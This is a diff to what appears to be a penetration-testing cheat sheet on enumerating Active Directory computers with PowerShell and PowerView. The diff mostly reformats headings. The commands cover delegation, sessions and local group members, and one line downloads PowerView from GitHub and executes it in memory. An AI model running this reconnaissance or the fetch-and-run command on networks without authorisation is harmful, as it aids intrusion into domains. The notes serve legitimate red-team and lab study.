@@ -29,17 +29,22 @@ Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1
 Get-Command -Module ActiveDirectory
 ```
 
-### Commands
+### Get List of Computers in current Domain
 
 ```powershell
-# Get list of computers in current domain
 Get-ADComputer -Filter * -Properties *
 Get-ADComputer -Filter * | Select Name
+```
 
-# Information about operating systems
+### Information about Operating Systems
+
+```powershell
 Get-ADComputer -Filter 'OperatingSystem -Like "*Server 2016"' -Properties OperatingSystem | Select Name,OperatingSystem
+```
 
-# Check for live hosts (depends on ICMP)
+### Check for Live Hosts (depends on ICMP)
+
+```powershell
 Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
 ```
 
@@ -59,35 +64,58 @@ Import-Module .\PowerView.ps1
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
 ```
 
-### Commands
+### Get List of Computers in current Domain
 
 ```powershell
-# Get list of computers in current domain
 Get-NetComputer
 Get-NetComputer -FullData
+```
 
-# Check for live hosts (depends on ICMP)
+### Check for live Hosts (depends on ICMP)
+
+```powershell
 Get-NetComputer -Ping
+```
 
-# Information about operating systems
+### Information about Operating Systems
+
+```powershell
 Get-NetComputer -OperatingSystem "*Server 2016"
 Get-NetComputer -FullData | select dnshostname,operatingsystem
+```
 
-# Get list of sessions on computer
+### Get list of sessions on Computer
+
+```powershell
 Get-NetSession -ComputerName "dc01.lab.local"
+```
 
-# Find any computers with constrained delegation set
+### Find any Computers with Constrained Delegation set
+
+```powershell
 Get-DomainComputer -TrustedToAuth
+```
 
-# Find all servers that allow unconstrained delegation
+### Find all Servers that allow Unconstrained Delegation
+
+```powershell
 Get-DomainComputer -Unconstrained
+```
 
-# Return the local *groups* of a remote server
+### Return the local Groups of a remote Server
+
+```powershell
 Get-NetLocalGroup SERVER.domain.local
+```
 
-# Return the local group *members* of a remote server using Win32 API methods (faster but less info)
+### Return the local Group Members of a remote Server using Win32 API Methods (faster but less info)
+
+```powershell
 Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
+```
 
-# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
+### Enumerates Computers in the current Domain with 'outlier' Properties
+
+```powershell
 Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
 ```
